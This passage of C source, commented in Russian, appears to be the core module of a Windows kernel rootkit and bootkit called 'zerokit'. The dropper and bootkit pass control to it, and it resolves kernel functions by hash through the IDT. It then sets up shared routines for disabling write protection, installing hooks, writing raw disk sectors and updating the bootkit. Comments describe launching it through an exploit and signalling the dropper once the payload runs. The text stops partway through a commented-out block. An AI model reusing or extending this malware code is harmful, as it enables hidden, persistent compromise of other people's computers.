/** Данный mod является своеобразным ядром для всех остальных. Дроппер и буткит должны передавать управление именно этому mod-у, после чего
    mod проинициализирует общую для всех струтуру, где будут необходимые функции ядра, а также утилитные функции предоставляемые самим mod-ом.

    Также этот mod предоставляет интерфейс для управления другими mod-ами.
*/

#include <ntifs.h>
#include <wdm.h>
#include <ntstrsafe.h>

#define DRIVER_ACPI_HAL_HASH 0xbcbfb06a // acpi_hal
//#define NTFS_SYS_HASH 0x19c298a7

#ifdef _WIN64

extern UCHAR keGetCurrentIrql();
extern UCHAR kfRaiseIrql(UCHAR newIrql);
extern void kfLowerIrql(UCHAR newIrql);

#endif // _WIN64

#include "../../mod_shared/headers.h"

#include "mod_common.c"
#include "mod_commonApi.c"

#if DBG
#include "dbg_pack.h"
#ifdef _WIN64

extern void* GetConfiguration();

#else

__declspec (naked) void* GetConfiguration()
{
    __asm {
        jmp cmnDataLabel
cmnCodeLabel:
        pop eax
        ret
cmnDataLabel:
        nop
        call cmnCodeLabel
#include "configuration.h"
    }
}


#endif // _WIN64


#endif // _DEBUG

typedef struct _startup_info
{
    union {
        pvoid_t pPrevZerokitPack;
        uint32_t startSector;
    };
    pvoid_t pCurrZerokitPack;
} startup_info_t, *pstartup_info_t;

typedef void (*Fncommon_check_system_disk)(pvolume_info_t pVolumeInfo, wchar_t driveLetter);

void common_check_system_disk(pvolume_info_t pVolumeInfo, wchar_t driveLetter)
{
    USE_GLOBAL_BLOCK

    pVolumeInfo->driveLetter = driveLetter;
    if ((pGlobalBlock->pCommonBlock->systemRootW[0] | 0x20) == (driveLetter | 0x20)) {
        pGlobalBlock->pCommonBlock->pSysDiskInfo = pVolumeInfo->pDiskInfo;
        pGlobalBlock->pCommonBlock->pSysVolumeInfo = pVolumeInfo;
    }
}

VOID common_main_thread(pstartup_info_t pStartupInfo)
{
    uint8_t* pCurrentPackBuffer = (uint8_t*)pStartupInfo->pCurrZerokitPack;
    uintptr_t modBase;
    int loadFromMem = ((int)pCurrentPackBuffer) & 1;
    uint32_t i;
    NTSTATUS ntStatus;
    RTL_OSVERSIONINFOEXW versionInfo;
    pmod_header_t pModHeader;
    LARGE_INTEGER delay;
    IDTR idtr;
    uint8_t* kernBase = NULL;
    uint8_t* halBase = NULL;
    pglobal_block_t pGlobalBlock;
    pmod_common_block_t pCommonBlock = NULL;
    FnmodEntryPoint fnmodEntryPoint;
    Fncommon_check_system_disk fncommon_check_system_disk = common_check_system_disk;
#if DBG
    FnGetDataFromCode fnGetConfiguration = GetConfiguration;
#endif // DBG
    FnfindModuleBaseFromIDT fnfindModuleBaseFromIDT = findModuleBaseFromIDT;
    FnfindModuleBaseByInnerPtr fnfindModuleBaseByInnerPtr = findModuleBaseByInnerPtr;
    Fnpe_find_export_by_hash fnpe_find_export_by_hash = pe_find_export_by_hash;
    Fncommon_calc_hash fncommon_calc_hash = common_calc_hash;
    Fncommon_allocate_memory fncommon_allocate_memory = common_allocate_memory;
    Fncommon_fix_addr_value fncommon_fix_addr_value = common_fix_addr_value;
    FnExAllocatePoolWithTag fnExAllocatePoolWithTag;
    FnExFreePoolWithTag fnExFreePoolWithTag;
    FnKeDelayExecutionThread fnKeDelayExecutionThread;
    FnPsTerminateSystemThread fnPsTerminateSystemThread;
    Fnmemset fnmemset;
    Fnmemcpy fnmemcpy;
    FngetStaticConfig fngetHDETable = getHDETable;

    // Восстанавливаем базу, если мы её изменили.
    pCurrentPackBuffer -= loadFromMem;
    if (loadFromMem) {
#ifdef _WIN64
        modBase = (uintptr_t)(pCurrentPackBuffer + ((pzerokit_header_t)(pCurrentPackBuffer + 1024 + 2))->sizeOfBootkit);
        modBase += ((pmods_pack_header_t)modBase)->sizeOfPack + (sizeof(mods_pack_header_t) << 1);
#else
        modBase = (uintptr_t)(pCurrentPackBuffer + ((pzerokit_header_t)(pCurrentPackBuffer + 1024 + 2))->sizeOfBootkit + sizeof(mods_pack_header_t));
#endif // _WIN64
    }
    else {
        modBase = (uintptr_t)pCurrentPackBuffer;
    }
    pModHeader = (pmod_header_t)modBase;

#if _SOLID_DRIVER == 0 && !defined(_WIN64)
    (uint8_t*)fncommon_calc_hash += MOD_BASE;
    (uint8_t*)fnfindModuleBaseFromIDT += MOD_BASE;
    (uint8_t*)fnfindModuleBaseByInnerPtr += MOD_BASE;
    (uint8_t*)fnpe_find_export_by_hash += MOD_BASE;
    (uint8_t*)fncommon_fix_addr_value += MOD_BASE;
    (uint8_t*)fncommon_allocate_memory += MOD_BASE;
    (uint8_t*)fncommon_check_system_disk += MOD_BASE;
    (uint8_t*)fngetHDETable += MOD_BASE;
#endif

    __sidt(&idtr);

    kernBase = fnfindModuleBaseFromIDT(&idtr, ExAllocatePoolWithTag_Hash, (void**)&fnExAllocatePoolWithTag, fnfindModuleBaseByInnerPtr, fnpe_find_export_by_hash, fncommon_calc_hash);
    fnKeDelayExecutionThread = fnpe_find_export_by_hash(kernBase, KeDelayExecutionThread_Hash, fncommon_calc_hash);
    fnExFreePoolWithTag = fnpe_find_export_by_hash(kernBase, ExFreePoolWithTag_Hash, fncommon_calc_hash);
    fnmemset = fnpe_find_export_by_hash(kernBase, memset_Hash, fncommon_calc_hash);
    fnmemcpy = fnpe_find_export_by_hash(kernBase, memcpy_Hash, fncommon_calc_hash);

    delay.QuadPart = -30000000I64;  // 3 секунды.

    if (loadFromMem && pStartupInfo->pPrevZerokitPack != NULL) {
        fnKeDelayExecutionThread(KernelMode, FALSE, &delay);

        // У нас случай передачи управления из старой версии зерокита на новую.
        fnExFreePoolWithTag(pStartupInfo->pPrevZerokitPack, LOADER_TAG);
    }

    do {
        pGlobalBlock = (pglobal_block_t)fnExAllocatePoolWithTag(NonPagedPool, sizeof(global_block_t), LOADER_TAG);
        if (pGlobalBlock == NULL) {
            fnKeDelayExecutionThread(KernelMode, FALSE, &delay);
            continue;
        }
        break;
    } while (TRUE);

    fnmemset(pGlobalBlock, 0, sizeof(global_block_t));

    if (loadFromMem) {
        // Выделяем новое место для зерокита.
        do {
            pGlobalBlock->pZerokitPack = (uint8_t*)fnExAllocatePoolWithTag(NonPagedPool, ((pzerokit_header_t)(pCurrentPackBuffer + 1024 + 2))->sizeOfPack, LOADER_TAG);
            if (pGlobalBlock == NULL) {
                fnKeDelayExecutionThread(KernelMode, FALSE, &delay);
                continue;
            }
            break;
        } while (TRUE);

        // Копируем весь пак в новый буфер.
        fnmemcpy(pGlobalBlock->pZerokitPack, pCurrentPackBuffer, ((pzerokit_header_t)(pCurrentPackBuffer + 1024 + 2))->sizeOfPack);
    }

    pGlobalBlock->loadFromMem = loadFromMem;

    // Выделяем память для базовых функций.
    do {
        pCommonBlock  = (pmod_common_block_t)fnExAllocatePoolWithTag(NonPagedPool, sizeof(mod_common_block_t), LOADER_TAG);
        if (pCommonBlock == NULL) {
            fnKeDelayExecutionThread(KernelMode, FALSE, &delay);
            continue;
        }
        break;
    } while (TRUE);

    fnmemset(pCommonBlock, 0, sizeof(mod_common_block_t));
    pGlobalBlock->pCommonBlock = pCommonBlock;
    pCommonBlock->pModBase = (uint8_t*)modBase;

    pCommonBlock->ntkernelBase = kernBase;
    pCommonBlock->ntkernelSize = (size_t)((PIMAGE_NT_HEADERS)(((PIMAGE_DOS_HEADER)kernBase)->e_lfanew + kernBase))->OptionalHeader.SizeOfImage;

    pCommonBlock->fnExAllocatePoolWithTag = fnExAllocatePoolWithTag;
    pCommonBlock->fnKeDelayExecutionThread = fnKeDelayExecutionThread;
    pCommonBlock->fnExFreePoolWithTag = fnExFreePoolWithTag;
    pCommonBlock->fnmemset = fnmemset;

    DECLARE_SYSTEM_FUNC(pCommonBlock, PsCreateSystemThread, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, PsTerminateSystemThread, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, KeDelayExecutionThread, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, MmIsNonPagedSystemAddressValid, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, RtlGetVersion, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, memset, kernBase);
#ifndef _WIN64
    DECLARE_SYSTEM_FUNC(pCommonBlock, KeInitializeSpinLock, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, _allmul, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, _alldiv, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, _aullrem, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, KeQuerySystemTime, kernBase);
#endif // _WIN64
#ifdef _WIN64
    DECLARE_SYSTEM_FUNC(pCommonBlock, PsWrapApcWow64Thread, kernBase);
#endif // _WIN64
    DECLARE_SYSTEM_FUNC(pCommonBlock, RtlCompareMemory, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, _vsnprintf, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, memcpy, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, memmove, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, strcmp, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, strlen, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, _stricmp, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, _wcsicmp, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, IoAllocateMdl, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, MmProbeAndLockPages, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, KeStackAttachProcess, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, MmMapLockedPagesSpecifyCache, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, ZwCreateFile, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, ZwDeviceIoControlFile, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, ZwClose, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, ZwWriteFile, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, ZwReadFile, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, ZwQueryInformationFile, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, ZwSetInformationFile, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, ZwFsControlFile, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, ZwWaitForSingleObject, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, ZwCreateEvent, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, ZwSetEvent, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, RtlInitAnsiString, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, RtlAnsiStringToUnicodeString, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, RtlUnicodeStringToAnsiString, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, RtlInitUnicodeString, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, RtlUnicodeStringToInteger, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, RtlFreeUnicodeString, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, RtlCompareUnicodeString, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, ZwOpenKey, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, ZwQueryValueKey, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, PsIsSystemThread, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, IoGetCurrentProcess, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, PsGetCurrentProcessId, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, MmMapIoSpace, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, MmUnmapIoSpace, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, IoFreeMdl, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, KeUnstackDetachProcess, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, MmUnmapLockedPages, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, MmUnlockPages, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, KeInitializeSemaphore, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, KeReleaseSemaphore, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, KeWaitForSingleObject, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, KeInitializeEvent, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, KeClearEvent, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, KeSetEvent, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, KeInitializeDpc, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, KeSetImportanceDpc, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, KeSetTargetProcessorDpc, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, KeInsertQueueDpc, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, MmIsAddressValid, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, NtQuerySystemInformation, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, NtQueryInformationProcess, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, NtQueryInformationThread, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, ObOpenObjectByName, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, ObOpenObjectByPointer, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, ObfReferenceObject, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, ObReferenceObjectByHandle, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, ObReferenceObjectByPointer, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, ObfDereferenceObject, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, NtAllocateVirtualMemory, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, ZwFreeVirtualMemory, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, ZwOpenDirectoryObject, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, ZwOpenSymbolicLinkObject, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, ZwQuerySymbolicLinkObject, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, IoBuildDeviceIoControlRequest, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, IofCallDriver, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, IofCompleteRequest, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, IoCancelIrp, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, ZwQueryDirectoryObject, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, MmMapLockedPages, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, KeSetBasePriorityThread, kernBase);
#ifndef _WIN64
    DECLARE_SYSTEM_FUNC(pCommonBlock, KeQuerySystemTime, kernBase);
#endif _WIN64
    DECLARE_SYSTEM_FUNC(pCommonBlock, KeQueryTickCount, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, KeQueryTimeIncrement, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, MmBuildMdlForNonPagedPool, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, KeInitializeApc, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, KeInsertQueueApc, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, PsSetCreateProcessNotifyRoutine, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, PsLookupProcessByProcessId, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, KeInitializeMutex, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, KeReleaseMutex, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, IoGetDeviceObjectPointer, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, IoBuildSynchronousFsdRequest, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, IoGetConfigurationInformation, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, RtlQueryRegistryValues, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, ObReferenceObjectByName, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, ExSystemTimeToLocalTime, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, RtlTimeToSecondsSince1970, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, IoRegisterShutdownNotification, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, IoUnregisterShutdownNotification, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, CcCopyWrite, kernBase);    
    DECLARE_SYSTEM_FUNC(pCommonBlock, IoGetAttachedDeviceReference, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, IoGetDeviceAttachmentBaseRef, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, IoAllocateIrp, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, IoFreeIrp, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, KeInitializeTimer, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, KeSetTimerEx, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, KeCancelTimer, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, IoRegisterLastChanceShutdownNotification, kernBase);
    DECLARE_SYSTEM_FUNC(pCommonBlock, DbgPrint, kernBase);

    pCommonBlock->pPsProcessType = fnpe_find_export_by_hash(kernBase, PsProcessType_Hash, fncommon_calc_hash);
    pCommonBlock->pPsThreadType = fnpe_find_export_by_hash(kernBase, PsThreadType_Hash, fncommon_calc_hash);
    pCommonBlock->pIoDeviceObjectType = fnpe_find_export_by_hash(kernBase, IoDeviceObjectType_Hash, fncommon_calc_hash);
    pCommonBlock->pIoDriverObjectType = fnpe_find_export_by_hash(kernBase, IoDriverObjectType_Hash, fncommon_calc_hash);
    pCommonBlock->pIoFileObjectType = fnpe_find_export_by_hash(kernBase, IoFileObjectType_Hash, fncommon_calc_hash);
    pCommonBlock->timeIncrement = pCommonBlock->fnKeQueryTimeIncrement();

    pCommonBlock->fncommon_calc_hash = fncommon_calc_hash;
    pCommonBlock->fncommon_fix_addr_value = fncommon_fix_addr_value;
    pCommonBlock->fnfindModuleBaseFromIDT = fnfindModuleBaseFromIDT;
    pCommonBlock->fnfindModuleBaseByInnerPtr = fnfindModuleBaseByInnerPtr;
    pCommonBlock->fnpe_find_export_by_hash = fnpe_find_export_by_hash;

    // Интерфейсные функции
    DECLARE_GLOBAL_FUNC(pCommonBlock, common_enable_wp);
    DECLARE_GLOBAL_FUNC(pCommonBlock, common_disable_wp);
    DECLARE_GLOBAL_FUNC(pCommonBlock, isValidPointer);
    DECLARE_GLOBAL_FUNC(pCommonBlock, common_atoi64);
    DECLARE_GLOBAL_FUNC(pCommonBlock, common_atou64);
    DECLARE_GLOBAL_FUNC(pCommonBlock, common_allocate_memory);
    DECLARE_GLOBAL_FUNC(pCommonBlock, common_get_base_from_dirver_object);
    DECLARE_GLOBAL_FUNC(pCommonBlock, common_find_base_by_driver_name);
    DECLARE_GLOBAL_FUNC(pCommonBlock, getCurrentProcessor);
    DECLARE_GLOBAL_FUNC(pCommonBlock, htonl);
    DECLARE_GLOBAL_FUNC(pCommonBlock, htons);
    DECLARE_GLOBAL_FUNC(pCommonBlock, common_save_file);
    DECLARE_GLOBAL_FUNC(pCommonBlock, common_wcscpy_s);
    DECLARE_GLOBAL_FUNC(pCommonBlock, common_wcscat_s);
    DECLARE_GLOBAL_FUNC(pCommonBlock, common_wcslen_s);
    DECLARE_GLOBAL_FUNC(pCommonBlock, common_wcsupper_s);
    DECLARE_GLOBAL_FUNC(pCommonBlock, common_wcscmp);
    DECLARE_GLOBAL_FUNC(pCommonBlock, common_strcpy_s);
    DECLARE_GLOBAL_FUNC(pCommonBlock, common_strcat_s);
    DECLARE_GLOBAL_FUNC(pCommonBlock, common_strlen_s);
    DECLARE_GLOBAL_FUNC(pCommonBlock, common_printfA);
    DECLARE_GLOBAL_FUNC(pCommonBlock, common_ansi_to_wide);
    DECLARE_GLOBAL_FUNC(pCommonBlock, common_wide_to_ansi);
    DECLARE_GLOBAL_FUNC(pCommonBlock, common_strstr);
    DECLARE_GLOBAL_FUNC(pCommonBlock, common_wcsstr);
    DECLARE_GLOBAL_FUNC(pCommonBlock, RegistryOpenKey);
    DECLARE_GLOBAL_FUNC(pCommonBlock, RegistryReadValue);
    DECLARE_GLOBAL_FUNC(pCommonBlock, common_change_byte_order);
    DECLARE_GLOBAL_FUNC(pCommonBlock, common_initialize_list_head);
    DECLARE_GLOBAL_FUNC(pCommonBlock, common_is_list_empty);
    DECLARE_GLOBAL_FUNC(pCommonBlock, common_remove_entry_list);
    DECLARE_GLOBAL_FUNC(pCommonBlock, common_remove_head_list);
    DECLARE_GLOBAL_FUNC(pCommonBlock, common_remove_tail_list);
    DECLARE_GLOBAL_FUNC(pCommonBlock, common_insert_tail_list);
    DECLARE_GLOBAL_FUNC(pCommonBlock, common_insert_head_list);
    DECLARE_GLOBAL_FUNC(pCommonBlock, common_append_tail_list);
    // Функция для работы с дисковой подсистемой Windows.
    DECLARE_GLOBAL_FUNC(pCommonBlock, common_dio_det_device_by_name);
    DECLARE_GLOBAL_FUNC(pCommonBlock, common_dio_get_volume_info);
    DECLARE_GLOBAL_FUNC(pCommonBlock, common_dio_read_sector);
    DECLARE_GLOBAL_FUNC(pCommonBlock, common_dio_write_sector);
    DECLARE_GLOBAL_FUNC(pCommonBlock, common_dio_rw_completion);
    //DECLARE_GLOBAL_FUNC(pCommonBlock, common_dio_rw_sector);
    DECLARE_GLOBAL_FUNC(pCommonBlock, common_dio_get_disk_size);
    DECLARE_GLOBAL_FUNC(pCommonBlock, common_dio_get_device_object_by_name);
    DECLARE_GLOBAL_FUNC(pCommonBlock, common_dio_identify_disk);
    DECLARE_GLOBAL_FUNC(pCommonBlock, common_dio_update_bootkit);
    DECLARE_GLOBAL_FUNC(pCommonBlock, common_update);
    DECLARE_GLOBAL_FUNC(pCommonBlock, common_get_system_time);
    DECLARE_GLOBAL_FUNC(pCommonBlock, common_get_base_name);
    DECLARE_GLOBAL_FUNC(pCommonBlock, common_map_driver);
    DECLARE_GLOBAL_FUNC(pCommonBlock, common_get_import_address);


    // Вычисление адресов всех глобальных функций для данного mod-а...
    DECLARE_GLOBAL_FUNC(pCommonBlock, base64_encode);
    DECLARE_GLOBAL_FUNC(pCommonBlock, base64_decode);
    DECLARE_GLOBAL_FUNC(pCommonBlock, hardclock);
    DECLARE_GLOBAL_FUNC(pCommonBlock, havege_fill);
    DECLARE_GLOBAL_FUNC(pCommonBlock, havege_init);
    DECLARE_GLOBAL_FUNC(pCommonBlock, havege_rand);
    DECLARE_GLOBAL_FUNC(pCommonBlock, lzma_decode);
    DECLARE_GLOBAL_FUNC(pCommonBlock, md5_start);
    DECLARE_GLOBAL_FUNC(pCommonBlock, md5_process);
    DECLARE_GLOBAL_FUNC(pCommonBlock, md5_update);
    DECLARE_GLOBAL_FUNC(pCommonBlock, md5_finish);
    DECLARE_GLOBAL_FUNC(pCommonBlock, md5);
    DECLARE_GLOBAL_FUNC(pCommonBlock, sha1_start);
    DECLARE_GLOBAL_FUNC(pCommonBlock, sha1_process);
    DECLARE_GLOBAL_FUNC(pCommonBlock, sha1_update);
    DECLARE_GLOBAL_FUNC(pCommonBlock, sha1_finish);
    DECLARE_GLOBAL_FUNC(pCommonBlock, sha1);
    DECLARE_GLOBAL_FUNC(pCommonBlock, aes_gen_tables);
    DECLARE_GLOBAL_FUNC(pCommonBlock, aes_setkey_enc);
    DECLARE_GLOBAL_FUNC(pCommonBlock, aes_setkey_dec);
    DECLARE_GLOBAL_FUNC(pCommonBlock, aes_crypt_ecb);
    DECLARE_GLOBAL_FUNC(pCommonBlock, aes_crypt_cbc);
    DECLARE_GLOBAL_FUNC(pCommonBlock, mpi_init);
    DECLARE_GLOBAL_FUNC(pCommonBlock, mpi_free);
    DECLARE_GLOBAL_FUNC(pCommonBlock, mpi_grow);
    DECLARE_GLOBAL_FUNC(pCommonBlock, mpi_copy);
    DECLARE_GLOBAL_FUNC(pCommonBlock, mpi_lset);
    DECLARE_GLOBAL_FUNC(pCommonBlock, mpi_lsb);
    DECLARE_GLOBAL_FUNC(pCommonBlock, mpi_msb);
    DECLARE_GLOBAL_FUNC(pCommonBlock, mpi_size);
    DECLARE_GLOBAL_FUNC(pCommonBlock, mpi_read_binary);
    DECLARE_GLOBAL_FUNC(pCommonBlock, mpi_write_binary);
    DECLARE_GLOBAL_FUNC(pCommonBlock, mpi_shift_l);
    DECLARE_GLOBAL_FUNC(pCommonBlock, mpi_shift_r);
    DECLARE_GLOBAL_FUNC(pCommonBlock, mpi_cmp_abs);
    DECLARE_GLOBAL_FUNC(pCommonBlock, mpi_cmp_mpi);
    DECLARE_GLOBAL_FUNC(pCommonBlock, mpi_cmp_int);
    DECLARE_GLOBAL_FUNC(pCommonBlock, mpi_add_abs);
    DECLARE_GLOBAL_FUNC(pCommonBlock, mpi_sub_hlp);
    DECLARE_GLOBAL_FUNC(pCommonBlock, mpi_sub_abs);
    DECLARE_GLOBAL_FUNC(pCommonBlock, mpi_add_mpi);
    DECLARE_GLOBAL_FUNC(pCommonBlock, mpi_sub_mpi);
    DECLARE_GLOBAL_FUNC(pCommonBlock, mpi_sub_int);
    DECLARE_GLOBAL_FUNC(pCommonBlock, mpi_mul_hlp);
    DECLARE_GLOBAL_FUNC(pCommonBlock, mpi_mul_mpi);
    DECLARE_GLOBAL_FUNC(pCommonBlock, mpi_mul_int);
    DECLARE_GLOBAL_FUNC(pCommonBlock, mpi_div_mpi);
    DECLARE_GLOBAL_FUNC(pCommonBlock, mpi_mod_mpi);
    DECLARE_GLOBAL_FUNC(pCommonBlock, mpi_montg_init);
    DECLARE_GLOBAL_FUNC(pCommonBlock, mpi_montmul);
    DECLARE_GLOBAL_FUNC(pCommonBlock, mpi_montred);
    DECLARE_GLOBAL_FUNC(pCommonBlock, mpi_exp_mod);
    DECLARE_GLOBAL_FUNC(pCommonBlock, mpi_gcd);
    DECLARE_GLOBAL_FUNC(pCommonBlock, rsa_init);
    DECLARE_GLOBAL_FUNC(pCommonBlock, rsa_free);
    DECLARE_GLOBAL_FUNC(pCommonBlock, rsa_check_pubkey);
    DECLARE_GLOBAL_FUNC(pCommonBlock, rsa_check_privkey);
    DECLARE_GLOBAL_FUNC(pCommonBlock, rsa_public);
    DECLARE_GLOBAL_FUNC(pCommonBlock, rsa_private);
    DECLARE_GLOBAL_FUNC(pCommonBlock, rsa_pkcs1_encrypt);
    DECLARE_GLOBAL_FUNC(pCommonBlock, rsa_public_decrypt_hash);
    DECLARE_GLOBAL_FUNC(pCommonBlock, arc4_crypt_self);
    DECLARE_GLOBAL_FUNC(pCommonBlock, crypto_random_init);
    DECLARE_GLOBAL_FUNC(pCommonBlock, crypto_random);

    DECLARE_GLOBAL_FUNC(pCommonBlock, dissasm_lock_routine);
    DECLARE_GLOBAL_FUNC(pCommonBlock, dissasm_install_hook);
    DECLARE_GLOBAL_FUNC(pCommonBlock, dissasm_uninstall_hook);
#ifdef _WIN64
    DECLARE_GLOBAL_FUNC(pCommonBlock, dissasm64);
    pCommonBlock->fndissasm = (Fndissasm)pCommonBlock->fndissasm64;
    //    pGlobalData->pTrampoline = (uint8_t*)Trampoline_ASM_x64 /*+ DRIVER_BASE*/;
#else
    DECLARE_GLOBAL_FUNC(pCommonBlock, dissasm32);
    pCommonBlock->fndissasm = (Fndissasm)pCommonBlock->fndissasm32;
    //    pGlobalData->pTrampoline = (uint8_t*)Trampoline_ASM_x86 + DRIVER_BASE;
#endif
    pCommonBlock->pDissasmTable = fngetHDETable();

    // В случае, если мы запустились эксплоитом, выделяем новый буфер и копируем сами себя туда.
#if DBG == 0
    if (loadFromMem) {
        if (pStartupInfo->pPrevZerokitPack == NULL) {
            HANDLE hFile;
            OBJECT_ATTRIBUTES objAttrs;
            IO_STATUS_BLOCK ioStatus;
            UNICODE_STRING uFileName;

            // Создаём файл, по которому дроппер сможет понять, что пейлод получил управление.
            pCommonBlock->fnRtlInitUnicodeString(&uFileName, (PCWSTR)(pCurrentPackBuffer - sizeof(exploit_startup_header_t)));
            InitializeObjectAttributes(&objAttrs, &uFileName, OBJ_CASE_INSENSITIVE, 0, NULL);

            ntStatus = pCommonBlock->fnZwCreateFile(&hFile, FILE_WRITE_DATA + SYNCHRONIZE, &objAttrs, &ioStatus, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE,
                FILE_OPEN_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);

            if (ntStatus == STATUS_SUCCESS) {
                pCommonBlock->fnZwClose(hFile);
            }
        }
        // Получаем указатель на конфигурацию, которая уже в памяти
        pCommonBlock->pConfig = (pconfiguration_t)(modBase + pModHeader->confOffset);
    }
    
#else
    pCommonBlock->fncommon_allocate_memory(pCommonBlock, &pGlobalBlock->pZerokitPack, sizeof(zkpack_data), NonPagedPool);
    pCommonBlock->fnmemcpy(pGlobalBlock->pZerokitPack, zkpack_data, sizeof(zkpack_data));

    pCommonBlock->pConfig = fnGetConfiguration();
// 
//     {
//         HANDLE hFile;
//         OBJECT_ATTRIBUTES objAttrs;
//         IO_STATUS_BLOCK ioStatus;
